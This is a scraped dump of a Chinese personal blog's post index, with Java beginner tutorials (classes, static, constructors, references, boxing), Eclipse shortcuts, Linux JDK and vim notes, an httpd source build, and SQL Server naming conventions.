12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970package home.pets;import java.io.*;public class FileUtil &#123; /** * * @return * 读取得到字符串，并且分隔获取到一个动物对象。 */ public Animal getPetDate() &#123; String readDate = readFile() ; if(readDate == null) return null ; String[] date = readDate.split(&quot; &quot;) ; Animal lastPet = new Animal() ; lastPet.setName(date[0]); lastPet.setSex(date[1]); lastPet.setAge(Integer.parseInt(date[2])) ; lastPet.setMoodVal(Integer.parseInt(date[3])) ; lastPet.setPhysicalVal(Integer.parseInt(date[4])) ; lastPet.setHealthVal(Integer.parseInt(date[5])) ; lastPet.setCloseVal(Double.parseDouble(date[6]) ) ; return lastPet ; &#125; public void savePetDate(Animal animal) &#123; writeFile(animal.toString()) ; &#125; // 读取文件 public static String readFile() &#123; String pathname = &quot;date.txt&quot;; // 绝对路径或相对路径都可以，写入文件时演示相对路径,读取以上路径的input.txt文件 //防止文件建立或读取失败，用catch捕捉错误并打印，也可以throw; //不关闭文件会导致资源的泄露，读写文件都同理 //Java7的try-with-resources可以优雅关闭文件，异常时自动关闭文件；详细解读https://stackoverflow.com/a/12665271 try (FileReader reader = new FileReader(pathname); BufferedReader br = new BufferedReader(reader) // 建立一个对象，它把文件内容转成计算机能读懂的语言 ) &#123; String line; //网友推荐更加简洁的写法 while ( (line = br.readLine()) != null ) &#123; return line; // 只读一次 &#125; return line ; // 文件读取到最后，只一个 null 空字符串 &#125; catch (IOException e) &#123; e.printStackTrace(); return null ; &#125; &#125; /** * 写入TXT文件 */ public static void writeFile(String string) &#123; try &#123; File writeName = new File(&quot;date.txt&quot;); // 相对路径，如果没有则要建立一个新的output.txt文件 writeName.createNewFile(); // 创建新文件,有同名的文件的话直接覆盖 try (FileWriter writer = new FileWriter(writeName); BufferedWriter out = new BufferedWriter(writer) ) &#123; out.write(string); // \\r\\n为windows下换行。 out.flush(); // 把缓存区内容压入文件 &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; JudgeInput 123456789101112131415package home.pets;public class JudgeInput &#123; public static int judge(String input, int begin, int end) &#123; if(input.length() != 1) return -1 ; else &#123; int val = (int)input.charAt(0) - (int)&#x27;0&#x27; ; if(val &gt;= begin &amp;&amp; val &lt;= end) return val ; else return -1 ; &#125; &#125;&#125; RatUtil 12345678910111213141516package home.pets;/** * * @author 方宁 * rat 常量，为中毒触发概率; * 如果中毒，返回 true ; */public class RatUtil &#123; public static boolean isHappen() &#123; int value = (int)(FinalVariable.RAT * 100) ; if( (int)(Math.random()*100) &lt; value) return true; else&#125; FinalVariable 1234567package home.pets;public interface FinalVariable &#123; public static final String ACCOUNT = &quot;123456&quot; ; public static final String PASSWORD = &quot;fn222.com&quot; ; public static final double RAT = 0.3 ; // 中毒概率&#125; 关于抽象，继承，接口","link":"","tags":[{"name":"java","slug":"java","permalink":"http://www.fangning.xyz.com/tags/java/"}]},{"title":"eclipse常用快捷键","date":"2021-11-05T01:21:30.000Z","path":"2021/11/05/2021.11.05 eclipse使用快捷键/","text":"Eclipse常用快捷键编辑123456789101112131415161. 赋值当前行到下一行 [Ctrl + Alt + ↓] # notepad++ 该功能为 ctrl+D2. 注释当前行 [ctrl + /] # 可光标多选 3. 多行缩进 [tab] / [shift + tab] # tab 向后，加shift向前 4. 格式化代码 [ctrl + shift + f] # 注意不能和输入法的 简/繁体切换快捷键冲突 5.6.7.8. 功能1234567891011121314151. 重命名 [F2] # 光标选中项目、包、类，然后按 F2 可进行重命名。2. 查找类源码 [Ctrl+Shift+T] # 如果显示源码丢失，可以重写修改查找路径为 JDK 中的 jre 包。 3. 补全代码 [Alt + /]4. 添加 setter, getter, constructor, hashCode, equals 方法 [Alt + s]5.6.7.8.9.","link":"","tags":[{"name":"java","slug":"java","permalink":"http://www.fangning.xyz.com/tags/java/"}]},{"title":"简单java类","date":"2021-11-04T07:11:30.000Z","path":"2021/11/04/2021.11.04 简单java类/","text":"thisthis 关键字比较灵活，因为使用的场景比较多样； 类中调用属性名称。 只要是在类中访问属性，都使用this进行+直接访问符访问； 1234public Person(String name , int age) &#123; this.name = name ; // 不加this，默认从 &#123; &#125; 当前代码块进程查询，得到参数 name， this.age = age ;&#125; ## 类中调用方法 类中调用成员方法，this.method()； 使用场景，定义一个方法时，需要复用到类中其它已定义的方法代码。 1234567891011121314151617class Person &#123; private String name ; private int age ; public Person(String name , int age) &#123; this.setName(name) ; // this调用当前类的成员方法 this.setAge(age) ; &#125; public void setName(String name) &#123; this.name = name ; // this调用当前类的成员属性 &#125; public void setAge(int age) &#123; if(age &gt;= 0 &amp;&amp; age &lt;= 300) this.age = age; &#125;&#125; 类中调用构造方法，this() 等价于 Person() ； 使用场景，在构造方法中调用其他重载的构造方法，避免了多个重载的方法内代码重复编写； this() 表示构造方法只能在构造方法的首行调用； 注意，不能出现循环调用； 多参调单参，单参调无参，无参不可再调多参。 也可全部调用最高参数的构造方法； 123456789101112// 构造public Person() &#123; System.out.println(&quot;*** 实例化了一个对象 ***&quot;) ; &#125;public Person(String name) &#123; this() ; // this() 表示构造方法，仅首行 this.setName(name) ; // this.成员方法&#125;public Person(String name , int age) &#123; this(name) ; this.setAge(age) ; &#125; 123456789101112131415161718192021222324252627class Emp &#123; // 属性 private long empId ; private String empName ; private String empDpt ; private double empSal ; // 构造 public Emp() &#123; this(1000 , &quot;无名氏&quot; , null , 0.0) ; &#125; public Emp(long id) &#123; this(id, &quot;无名氏&quot;, null, 0.0) ; &#125; public Emp(long id, String name) &#123; this(id, name, null, 0.0) ; &#125; public Emp(long id, String name, String dpt) &#123; this(id, name, dpt, 0.0) ; &#125; public Emp(long id, String name, String dpt, double salary) &#123; this.empId = id ; this.empName = name ; this.empDpt = dpt ; this.empSal = salary ; &#125;&#125; 描述当前对象。 注意 {}作为查找边界，查找参数名称具有 就近取用 原则； 评价代码好坏 代码结构可以重用，提供的是一个中间支持； 代码高可用，要求没有重复。 简单java类可以描述一类信息的一个类：可以是一个人，一本书，一个部门…… 类中没有复杂的逻辑操作，只作为信息存储的媒介。 简单java类在实际项目中，始终存在，且常用。 特点 类名称有意义，明确描述一类事物； 类之中所有属性 private 封装，提供 setter 和 getter 方法； 类可以多个构造方法，但一定要保留无参构造方法； 类中不允许提供输出语句，获取的内容只能通过返回； 【非必须】可以提供一个获取对象详细信息的方法，取名为 getInfo(); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859class Dept &#123; // 有意义的类名称 private String dptName ; // private封装属性 private String dptLoc ; private int dptNum ; // 构造 public Dept() &#123; // 必须有无参构造 &#125; public Dept(String name) &#123; this() ; this.dptName = name ; &#125; public Dept(String name, String location) &#123; this(name) ; this.dptLoc = location ; &#125; public Dept(String name, String location, int num) &#123; this(name, location) ; this.dptNum = num ; &#125; // 设置 public void setName(String name) &#123; // 有setter,getter this.dptName = name ; &#125; public void setLocation(String location) &#123; this.dptLoc = location ; &#125; public void setNumber(int num) &#123; this.dptNum = num ; &#125; // 获取 public String getName() &#123; return this.dptName ; &#125; public String getLocation() &#123; return this.dptLoc ; &#125; public int getNumber() &#123; return this.dptNum; &#125; public String getInfo() &#123; // 无输出，只能通过 return 返回 return &quot;【部门名称】：&quot; + this.dptName + &quot;,&quot; +&quot;【部门地点】：&quot; + this.dptLoc + &quot;,&quot; +&quot;【部门人数】：&quot; + this.dptNum + &quot;。&quot; ; &#125;&#125;public class Hello &#123; public static void main(String args[]) &#123; Dept dpt = null ; dpt = new Dept(&quot;技术开发&quot;) ; dpt.setLocation(&quot;上海&quot;) ; dpt.setNumber(200) ; System.out.println( dpt.getInfo() ) ; &#125; &#125; static​ 使用场景：对于每个对象都具有的公共属性，如果每个实例化对象都单独定义一个属性到堆区，就造成了重复；并且公共属性需要修改的时候，不方便；这时候就需要考虑使用静态全局变量区声明类的改公共属性。 静态存储区不同于堆栈区，static 修饰的属性，保存在静态区。 特点是，所有该类的实例化对象所共用，具有全局特性！ 可不实例化对象，直接调用，一般通过类名直接调用，修改。不建议通过实例化对象修改。 static属性12345678910111213141516171819202122232425262728class Person &#123; private String name ; private int age ; public static String country ; public Person() &#123; this.name = &quot;无名&quot; ; &#125; public Person(String name, int age) &#123; this.name = name ; if(age &gt; 0) this.age = age ; &#125; public void getInfo() &#123; System.out.println(this.name + &quot;今年&quot; + this.age + &quot;岁了！&quot; + &quot;来自&quot; + this.country) ; &#125;&#125;public class Hello &#123; public static void main(String[] args) &#123; Person.country = &quot;中国&quot; ; // 由类统一做修改 Person per = new Person(&quot;方宁&quot;, 21); per.getInfo() ; // 全局所有对象都改变 &#125;&#125;// 方宁今年21岁了！来自中国 static方法 静态方法同静态属性，都存储在静态区，可不实例化对象直接调用。 堆栈区的非 static 方法可以调用静态区的 static 方法； 静态区的 static 方法只能调用同在静态区的 static 方法； 1234567891011121314151617181920212223242526package com.test01;public class Test &#123; public static String country ; public static void print(String s) &#123; System.out.print(s) ; &#125; public void println(String s) &#123; System.out.println(s) ; 法 &#125; public static void main(String[] args) &#123; print(&quot;123&quot;) ; Test.print(&quot;456&quot;); Test.country = &quot;中国&quot; ; //println(Test.country) ; // 此处报错 for(String s : args) &#123; // String[] 是一个引用数组，类似于指针数组 print(s) ; &#125; &#125;&#125;// 综上、不可越界访问存储区！// 堆栈可访问静态，静态只可访问静态！ static应用 自动计数：每次实例化一个对象，进行自动计数； 12345678class Book &#123; private String name ; public static int count= 0 ; // 共用性 public Book(String name) &#123; this.name = name ; count++ ; &#125;&#125; 自动命名：对于无参构造，进行有序的自动命名； 1234567891011121314151617181920212223class Book &#123; private String name ; public static int count= 0 ; public Book() &#123; this(&quot;defualtBOOK-No.&quot; + (++count) ) ; &#125; public Book(String name) &#123; this.name = name ; &#125;&#125;/**new Book(&quot;格林童话&quot;).getInfo() ;new Book().getInfo() ;new Book(&quot;java入门到入坟&quot;).getInfo() ;new Book().getInfo() ;**/// result：/**书名：格林童话书名：defualtBook-No.1书名：java入门到入坟书名：defualtBook-No.2**/ 注意 95%的情况下考虑使用非 static 属性，只有考虑公共属性的时候，才使用static； static 定义的方法或者是属性都不是你代码设计之初需要考虑的内容，只有在回避实例化对象调用，并且描述公共属性的情况下，才会考虑使用 static 定义的方法或者是属性。 代码块‘{}’ 所包含的代码，就叫代码块。常用代码块分类：普通代码块、构造块、静态块、同步代码块（多线程编程时用到）。 普通代码块概念方法中，仅用 {} 囊括。 特点可以在一个方法中进行结构的拆分，防止相同的变量名称所带来的相互影响。 1234567891011121314public class Test &#123; public static void main(String[] args) &#123; &#123; int x = 100 ; System.out.println(x) ; &#125; &#123; int x = 10 ; System.out.println(x) ; &#125; int x = 1 ; System.out.println(x) ; &#125;&#125; 构造块概念类中，使用 {} 囊括。主要是为了为成员属性的多条语句初始化。 特点仅在每次实例化对象的时候调用，并且优先于构造方法执行！ 1234567891011class Person() &#123; public Person() &#123; System.out.println(&quot;【构造方法】执行。&quot;) ; &#125; &#123; System.out.println(&quot;【构造快】执行。&quot;) ; &#125;&#125;// 当 new Person() 后输出：// 【构造块】执行。// 【构造方法】执行。 静态代码块概念类中，使用 static 关键字定义的代码块。 特点 普通类中 优先于构造块，和构造方法执行；并且无论实例化对象多少次，只执行一次。 作用：主要用来，给 static 属性初始化。 虽然属性初始化可以在属性声明的时候直接使用赋值语句； 但是如果初始化所需值，需要多条语句才能获得，就需要采用静态代码块进行编写！ 12345678910111213141516171819class Message() &#123; public static String getCountry()&#123; // 网络中获取信息 return &quot;中华人民共和国&quot; ; &#125;&#125;class Person() &#123; public static String country ; static &#123; // 多次实例化对象，但只执行一次！ System.out.println(&quot;1【静态块】执行。&quot;) ; country = Message.getCountry() ; // 主要功能类中为静态属性初始化 &#125; &#123; System.out.println(&quot;2【构造块】执行。&quot;) ; &#125; public Person() &#123; System.out.println(&quot;3【构造方法】执行。&quot;) ; &#125;&#125; 主类中 主类中的静态代码块。 优先于主类中静态 main 方法执行。 作用： 主要用来做程序执行之前的初始化，帮助执行一些准备过程。 虽然说主方法是程序执行的起点，但是 java 提供了静态代码块这一更高优先级的功能。 12345678public class Hello &#123; static &#123; System.out.println(&quot;**********欢迎来到程序**********&quot;) ; &#125; public static void main(String[] args) &#123; &#125;&#125; 综上静态代码块优先级 &gt; 静态方法； 构造代码块优先级 &gt; 构造方法； 静态代码块优先级 &gt; 构造代码块优先级 &gt; 普通代码块优先级；","link":"","tags":[{"name":"java","slug":"java","permalink":"http://www.fangning.xyz.com/tags/java/"}]},{"title":"如何设计类","date":"2021-10-30T20:12:30.000Z","path":"2021/10/31/2021.10.31 如何设计类/","text":"成员属性封装安全性 类中的内容就是属性和方法； 方法是对外服务的，不需要具有较高的安全性； 而属性需要具有较高的安全性，所以需要==对其进行保护==，采取==封装性进行保护。== 封装作用 默认情况下，类中的成员属性，是可以通过参考名称+直接访问符”.”进行修改的； 为了防止外部错误修改，需要对成员属性进行封装处理，==进行访问权限控制==。 属性封装 使用 ==private== 关键字修饰需要封装的成员变量；该属性不能再类外部直接访问，只能在类内部访问。 封装过的属性，只能通过==类所提供的属性访问方法==来进行修改； setXXX(type velue) ; getXXX() ; ==封装的作用体现==：通过方法这一个间接访问途径，可以在 setXXX() 方法中添加对外部的修改操作的合法性筛选条件。 如果不提供方法操作，那么类属性将不可变更。 12345678910111213141516171819202122232425262728class Person &#123; String name ; private int age ; void setAge(int a) &#123; if(a &gt;= 0 &amp;&amp; a &lt;= 200) age = a ; &#125; int getAge() &#123; return age; &#125; void tell() &#123; System.out.println(name + &quot;今年&quot; + age + &quot;岁了！&quot;); &#125;&#125;public class Hello &#123; public static void main(String args[]) &#123; Person per = null ; per = new Person() ; per.name = &quot;张三&quot; ; // 直接访问，不安全 per.setAge(-18) ; // 间接访问，通过方法筛选，安全 per.tell() ; // 张三 0 岁了！ &#125;&#125; 注意 ==对于 java 类的设计过程中，所有成员属性都需要进行private封装，标准做法。== 语句只能出现在方法中，类中主要进行声明。 类成员属性，要么只进行声明，要么声明并定义，不能在类中单独对变量进行赋值语句。 12345class Person &#123; private int age ; // 无错 public static final int AGE = 18 ; // 无错 int age = 1; // 报错&#125; 构造方法 当成员属性过多时，初始化对象需要调用太多 setter() 方法； 构造方法可以在对象实例化过程中，==一次性初始化对象所有属性；== 特点 构造方法名称和类名称一致； 构造方法不写返回值，不是 void ，==是根本没有返回值；== 构造方法，==只能由 new 关键字自动调用==； 1234567891011121314151617181920212223242526class Person &#123; private String name ; private int age ; // 注意构造方法不写返回值，不是 void ，根本没有 public Person(String n, int a) &#123; name = n ; setAge(a); &#125; public void setAge(int a) &#123; if(a &gt;= 0 &amp;&amp; a &lt;= 200) age = a; &#125; public void tell() &#123; System.out.println(name + &quot;今年&quot; + age + &quot;岁了！&quot;); &#125;&#125;public class Hello &#123; public static void main(String args[]) &#123; Person per = new Person(&quot;张三&quot;, -18) ; // 只能new自动调用 per.tell() ; &#125;&#125; 注意 ==成员方法可以相互调用。==如果需要对构造方法进行合法性筛选，可以在构造方法中调用 setXXX() 方法； java 中给所有类都提供有一个==默认的无参构造方法==，如果明确写有构造方法，默认的构造方法不会被构建。 ==构造方法也可以进行重载。== 重载顺序按照参数数量排序编写。 1234567891011121314public Person() &#123; name = &quot;未设置&quot;; age = 0;&#125;public Person(String n) &#123; name = n ;&#125;public Person(int a) &#123; setAge(a) ;&#125;public Person(String n, int a) &#123; name = n ; setAge(a) ;&#125; 匿名对象​ ==没有参考名称指向的实例对象==，就是一个==匿名对象==；匿名对象没有名字，只有在堆区定义了一片空间，一次执行后无法继续被调用，==一次性用完就成为了垃圾空间==。 1Person(&quot;张三&quot;， 18).tell() ; // 可以只实例化对象，不分配名称；执行完后 GC 回收。","link":"","tags":[{"name":"java","slug":"java","permalink":"http://www.fangning.xyz.com/tags/java/"}]},{"title":"Linux下配置JDK","date":"2021-10-17T11:25:30.000Z","path":"2021/10/17/2020.10.17 Linux下Java/","text":"Linux 下配置Java开发环境 下载 JDK 找到JDK的Linux安装包，或者路径。 下载 使用 wget 命令进行下载。 VMWare可以使用共享文件夹，下到宿主机，然后共享给虚拟机（/mnt中） 使用 -zxf 解压 -C 指定解压路径 配置环境变量 JAVA_HOME 和 PATH 修改配置文件 root 配置文件路径：etc/profile 用户配置文件路径：/.bush_profile 在末尾添加修改修改信息 123export JAVA_HOME=/root/download/jdk8u302-b01 # jdk 目录因人而异export CLASSPATH=$CLASSPATH:$JAVA_HOME/libexport PATH=$PATH:$JAVA_HOME/bin 验证1java -version # 查看是否出现 jdk 版本信息 编写运行 新建 Hello.java 文件 12345public class Hello &#123; public static void main(String[] args)&#123; System.out.println(&quot;Hello World!&quot;); &#125;&#125; 编译 javac Hello.java 执行 java Hello 查看字节码 javap Hello 在命令行使用外部包中类提供的方法，==源代码需要使用方法的完整路径==：java.util.Arrays.toString()","link":"","tags":[{"name":"java","slug":"java","permalink":"http://www.fangning.xyz.com/tags/java/"}]},{"title":"vim与软件安装","date":"2021-02-21T10:52:30.000Z","path":"2021/02/21/2021.02.21 vim与软件安装/","text":"Vim编辑器基本用法简介 vi 是一个编辑器。 vim 时vi编辑器的加强版，可语法高亮… vim [文件名] — 新建或编辑该文件。 工作模式及操作 命令行模式 2yy 复制当前行及下一行 p 粘贴到当前行下 dd 删除当前行 gg 回到第一行 G 到最后一行 50G 快速跳转到第 50 行 编辑模式 随意编辑文本。Esc 退出到命令行模式。 末行模式 :wq 保存并退出 :q! 强制退出 :set nu 显示行号 % s/old/new/g 将每一行中的 old 替换成 new 50,56 d 删除第50~56行。 a vim study game：游戏挺不错的，爱不释手，不过只有前三关免费:sob: 1234567891. k上、j下、h左、l右2. x 删除光标所在位置字符3. w 跳转到下一个单词起始位置4. e 跳转到下一个单词的结束位置5. b 跳转到上一个单词的起始位置 软件安装源码包安装 — 安装 httpd web 服务器软件 GNU社区，软件官网，github等地方都有很多开源源码包。 源码包安装： 1、下载源码包。 2、解压。 3、了解软件作用及安装方法。 4、通过配置脚本文件，指定安装路径和功能。并且生成 makefile 编译脚本文件。 5、编译，生成可执行文件，二进制文件。 6、安装，将编译无误的可执行文件复制到安装目录。 7、stat启动软件。 卸载：万物皆文件，删掉程序安装目录，就相当于卸载。 安装阿帕奇 httpd 软件 123456789101112131415161718192021221. 官网下载 httpd-2.4.56.tar.bz22. tar -jxf /root/下载/httpd-2.4.46.tar.bz2 -C /usr/src/3. 阅读 README 文件了解软件作用，阅读 INSTALL 文件，了解安装方法如下： $ ./configure --prefix=PREFIX $ make $ make install $ PREFIX/bin/apachectl star 按照以上指示步骤进行安装。4. （1）查看配置脚本文件作用：./configure --help * enable选项为默认不安装功能 * disable选项为默认安装功能 （2）执行脚本文件，并指定安装路径：./configure --prefix=/usr/local/webserver （3）检查是否能够编译改软件源码，并且生成makefile编辑脚本文件。5. make --- 根据编辑脚本文件进行编译6. make install --- 复制到安装目录6. /usr/local/webserver/bin/apachectl star --- 执行 缺少apr、apr-util、pcre致错-解决方法 缺少依赖库expat致错-解决方法 软件包安装","link":"","tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.fangning.xyz.com/tags/Linux/"}]},{"title":"java面向对象","date":"2021-02-05T03:08:30.000Z","path":"2021/02/05/2021.02.05 java面向对象/","text":"面向对象面向对象与面向过程 面向过程 效率比较高； 主要面对一个问题的解决方案，关注于问题的完成，不会做出重用的代码思考。 面向对象 模块化设计，注重步骤的==重用配置==，注重标准和复用； 将生活中的实际问题分解成每一个步骤，然后将==步骤抽象成类==，用的时候将各部分进行组合； 由分-&gt;到组。 特性 封装性 内部操作对外部不可见，不可直接使用，保证==安全性==。 继承性 在已有结构的基础上，做功能的扩充。 多态性 在基础性的基础上，扩充的概念。指的类型的转化处理。 设计步骤 OOA：面向对象==分析==，以==生活中的思维分析方式来进行面向对象分析==，万物皆可为对象。 OOD：面向对象==设计==。 OOP：面向对象==编程==。 类和对象​ 想要产生对象必须先定义类，类是对象的设计图，对象是类的实例。类是对某一事物的共性的抽象概念，对象描述的是具体的产品。 ​ 同一个类的每一个对象，都具有部分共性；但是每个对象又都是不同的。 类中一般组成： 成员属性（Field）：或者叫属性，一个个具体的变量。 一个人都有年龄，姓名，但是每个人都不同。 操作方法（Method）：定义对象具有的处理行为，可以操作的重复执行的代码。 跑步，游泳…… ==类中有的定义操作，才是对象可以做的事情；类中有的变量，才是对象可以保存的东西。== 具体定义类的定义​ 类是一个结构体，需要用 class 关键字定义。包含成员属性，也就是一个个变量；以及成员方法，对象所可以进行重复执行的代码。 类定义关键字 -&gt; class 12345678class Clothes&#123; String color ; char size ; double prise ; char getSize() &#123; return this.size; &#125;&#125; 对象的定义​ 有了类之后，如果需要操作，需要定义对象来完成，如果要产生对象，用一下语法格式来完成： 声明并实例化对象：==类名词 对象名称 = new 类名称();== ==强烈建议分步骤完成：== 先声明：类名称 对象名称 = null; 再实例：对象名称 = new 类名称(); 类是张设计图，有了图纸，就需要设计实物。 12new Clothes(); //设计一个实物，新建一个对象Clothes c1 = new Clothes(); // 给设计的实例一个参考名称c1，也就是变量名 使用对象操作类==再次说明，现在为了方便将类和主类放在一个文件中，开发过程中，一个 Class 独占一个文件。== 普通类定义在公共类的外面。 123456789101112131415161718192021222324252627package com.fangning;// 设计图纸class Clothes&#123; String color; char size;&#125;public class Main&#123; public static void main(Stringp[] args)&#123; // 程序入口 // 按照图纸制作实例 Clothes sun = null ; sun = new Clothes() ; Clothes spring = null ; spring = new Clothes() ; sun.color = &quot;red&quot; ; sun.size = &quot;S&quot; ; spring.color = &quot;green&quot; ; spring.size = &quot;M&quot; ; System.out.printf(&quot;衣服sun的颜色是%s，大小为%c\\n&quot;, sun.color, sun.size) ; &#125;&#125; 一个源码文件可以有多个非公开类，但只能有一个公开类 public 类。编译程序为为每一个类的定义单独产生一个 .class 文件 因此，上述代码会产生 Clothes.class 和 Main.class 两个文档。 注意： 一般一个 .java 文件里面只放一个 class 无论是公开类还是普通类。 现在只是最开始，所以有时为了方便把多个 class 放到一个文件。 主方法所在类叫主类，主类一般以 public 修饰。 对象内存分析 两个最为常用的内存空间 ==堆内存==：保存的是对象的具体信息。 ==栈内存==：保存的是一块堆内存的地址。 通过地址找到堆内存，而后找到对象内容。 通常我们说，对象的名称保存在栈内存中（实际上是对象的地址），也叫参考变量、引用、标签。 ==规则== 只能通过 new 关键字申请堆内存空间； 类的内容决定堆内存中的内容，属性默认值为0； 对象名称（参考名称，引用）存储对象的地址，并且放到栈内存中； 可以通过地址来访问堆内存，和修改堆内存。 没有实例化对象只有声明不能直接使用。 对于引用数据类型，声明的参考变量如果过没有实例化，就没有内存空间，指向 null 。 对于基本数据类型，一般情况声明的同时就分配了内存，也就是默认定义了。 引用传递分析什么是引用传递 堆内存的同一块内存空间，可以被多个不同的栈内存所指。 所谓的引用传递，就是对于引用数据类型在进行 “=” 等号赋值的时候，内存空间是不变的，只是两个参考变量所指的地址相同，两个栈内存内容一致，堆内存还是只有一个不变。 1234567891011121314151617181920class Person &#123; String name ; int age ; void tell() &#123; System.out.println(name + &quot;今年&quot; + age + &quot;岁了！&quot;); &#125;&#125;public class Demo &#123; public static void main(String args[]) &#123; Person p1 = null ; p1 = new Person() ; p1.name = &quot;张三&quot; ; p1.age = 18 ; Person p2 = p1 ; p2.age = 80 ; p1.tell() ; // 输出结果张三80岁 &#125;&#125; 从始至终只有一个 new， 所以堆内存只有一个Person实例对象。两个栈内存p1、p2多操作的是同一块内存空间。相当于两个标签贴在同一个产品上。 而对于引用数据类型在方法参数的传递，也是传递的地址，所以在方法内部修改的也是同一个块堆内存；同 C 语言中，通过函数参数修改 int 和 char[] 是一样的。根本还是在于基本数据类型传递的只是数值，引用数据类型传递的是地址。 12345678910public static void main(String args[]) &#123; Person per = null ; per = Person() ; change(per) ; per.tell() ;&#125;public static void change(Person temp) &#123; temp.name = &quot;张三&quot; ; temp.age = 18 ;&#125; 发生情况 使用 “=” 进行引用数据类型运算时； 方法调用，通过方法的参数进行传递。 引用传递与垃圾产生分析​ 引用传递就是多个栈内存对一个堆内存的操作，如果引用传递处理不当会造成垃圾产生。 垃圾产生过程：栈内存被传递了另外一个实例对象的地址，造成原来实例对象地址被覆盖丢失，原来实例对象所在的堆内存就成为了垃圾空间。 123456789Person per1 = new Person() ;Person per2 = new Person() ;per1.name = &quot;zhangshan&quot; ;per1.age = 19 ;per2.name = &quot;lisi&quot; ;per2.age = 20 ;per2 = per1 ; // 丢失了 lisi 对象实例地址per2.age = 80 ;per1.tell() ; ==所有没有被栈内存所指的堆内存都属于垃圾空间。==per2 原来的对象实例地址现在没有被任何人引用，它将彻底被遗忘，就变成了垃圾空间； ==垃圾收集器CG==（Garbage Collector）会定期自动回收垃圾空间，但是垃圾过多，会影响CG的处理性能，所以==程序设计过程中，要注意避免垃圾的产生。== 标准类 java SE 提供了标准 API，这些API就是由许多类组成的。我们可以直接利用这些标准的类，为设计出自己所需要的程序。 java.util.Scanner; 提供标准输入的类。 1234567import java.util.Scanner;//用法Scanner sc = new Scanner(System.in);sc.hasNext();sc.nextInt();sc.nextBoolean();sc.nextLine(); Scanner 方法的默认内置分割符为空格，制表符，换行。如果想要用其它方式作为分隔符，可以参考内置的 useDelimiter方法。 java.math.BigDecimal; 使用 BigDecimal 创建支持高精度浮点数运算的对象，进行大浮点数运算。 123456import java.math.BigDecimal;BigDecimal num1 = new BigDecimal(&quot;1.0&quot;); // 调用构造函数，参数为字符串BigDecimal num2 = new BigDecimal(&quot;0.8&quot;);BIgDecimal ans = num1.subtract(num2); // num1 - num2System.out.println(ans); 其原理为将高精度数据转化为字符串进行运算。 包含的成员方法有： add()、substract()、multipoly()、divide() … 代表加、减、乘、除。返回 BigDecimal 对象 **equals()**。判断两个高精度数据是否相等，返回 Boolean 类型。 1234567891011// 多实例， 每行输入两个数，输出两个数的和。public class Main&#123; public static void main(String[] args) &#123; Scanner sc = new Scanner(System.in); while(sc.hasNext())&#123; BigDecimal num1 = new BigDecimal(sc.next()); BigDecimal num2 = new BigDecimal(sc.next()); System.out.println(num1.add(num2)); &#125; &#125;&#125; 嵌套用法 1num1.add(num2).add(num3).equals(num); // num1 + num2 + num3 == num java.math.BigInteger; 支持超大数的整数运算。 用法与 BigDecimal 类似。 对象（==、=）类类型比较原理 对于基本类型，= 是将值复制给变量；== 比较两个变量存储的值是否相同。 对于类类型，= 是指定参考名称绑定到指定对象上；== 是比较两个名称是否绑定在同一个对象上面。 如果要比较两个不同对象的值是否相同，一定要使用 equals() 成员方法，否则可能会出错。 自动装箱、拆箱有时，我们想要想操作对象一样来运用 java 中的基本数据类型 boolean, short, byte, int, long, double, float 等。此时，可以将每一类基本数据类数据，包装到与之对应的类类型当中。如：Lang, Integer, Double … 12345678910111213// 手动装箱int num = 10;Integer number = new Integer(num);// 自动装箱、拆箱int num = 10, num2;Integer number = num; // 装num2 = number; // 拆// 类类型外壳提供的方法Integer.compareTo(Integer data2); // 比较Integer.doubleValue(); // 返回double类型数据Integer.equals(Integer data2); 自动装箱代码内幕。编译器实际上是自动将其转化为手动装箱过程。如下： 12345// 转化前Integer num = 100;// 转化后Integer localInteger = Integer.valueOf(100); // 调用 valueOf()静态类方法，以100为值返回 Integer 对象。 需要注意的是，valueOf() 静态方法的底层代码。 1234567891011121314151617181920public static Integer valueOf(int i) &#123; if(i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i);&#125;/**可将自动装箱，为什么使用 valueOf() 类方法创建对象？而不是使用 new Integer(i); 构造方法创建对象呢？valueOf() 中多加了一个判断，如果之前的缓冲 Cache 中打包过[low, high]范围内的值，就直接返回之前创建的对象。如果不在[low, high]范围内，才返回新的对象。**/// 举例Integer num1 = 200;Integer num2 = 200;if(num1 == num2); // 答案 false 因为 num1，num2 是绑定在两个不同对象中。Integer data1 = 100;Integer data2 = 100;if(data1 == data2); // 答案 true, 此时因为 data2 打包过程中，100 在[-128, 127] 之间，并且之前打包过在Cache中，所以返回原来第一含的对象给参考名称 data2。 总结：别用 == 或者 != 来判断两个对象实质内容是否相同或者不同，而要采用 equals() 方法。 相关经验 在一些金融领域的应用，金额不允许进行舍入误差。所以不能用 float、double 只能使用 BigDecimal。 任何类型的参考名称，可以绑定到 null 空指针当中。如 Integer num = null; 相当于，一个实物标签，并没有挂在任何东西上。","link":"","tags":[{"name":"java","slug":"java","permalink":"http://www.fangning.xyz.com/tags/java/"}]},{"title":"SQLServer命名规范","date":"2020-12-24T11:04:30.000Z","path":"2020/12/24/2020.12.24 SQLServer命名规范/","text":"命名协议数据库命名原则及版本控制数据库命名原则 数据库命名要遵从以下命名原则： 表意性原则：数据库命名本着表意性原则，即命名应尽量反映存储 /action/view/column 的数据内容。 长名原则：很少使用或者不使用缩写，适用于DB命名之外的任一对象。 数目最少化原则：数据库对象应该尽量满足数据最小化原则，也就是数据库数目，存储过程，视图等数量最小化。 数据库版本控制 当由于多个版本的应用系统同时存在或者是其它特殊原因而使用完成相似的功能的对象存在同时存在时，使用版本控制：版本号在对象名的后面加上 [ _v1 ] 如： Up_IM_DailyUsageStatsUpdate_v2 Up_IM_CustomerGetUsingLastName_v2 Server / 命名实例的命名 基于 Domain 命名, DOMAIN 的粒度，可分为三级：分别是Server级别，Database级别和表的前缀级别。此为第一级别。 ONLINE PRODUCTION SERVER NEWSQL NEWSQL2 EHISSQL WAREHOUSE PRODUCTION SERVER S3SQL01 S4SQL01 S7SQL01 S6SQL01 数据库命名 首字母大写，驼峰式。 ReortServer.mdf RepoerServerTempDB.mdf 用产品或项目的名字命名。 Student Charge 禁止使用特殊符号，如数字、下划线、空格格等等… 禁止使用缩写！ 代码中的命名不要与数据库名称冲突、数据库名称应该唯一不要与其他数据库名重复。 